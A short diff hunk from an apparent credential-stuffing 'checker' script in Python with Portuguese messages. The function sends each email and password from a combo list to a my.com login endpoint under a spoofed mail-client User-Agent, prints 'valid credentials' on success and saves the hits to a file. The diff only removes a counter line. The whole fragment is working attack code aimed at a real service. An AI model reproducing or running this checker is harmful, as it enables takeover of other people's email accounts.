@@ -69,7 +69,6 @@ ldb=len(db)
 def checker(email, senha, c, ldb, txt):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
-        v=v+1
         print(f'{EG}{G}Credenciais válidas: {C}'+combo)
         print(f'{IB}E-mails verificados: {G}'+str(c)+C+', e-mails restantes: '+G+str(ldb-c)+C)
         with open(txt+'.txt', 'a+') as chk:
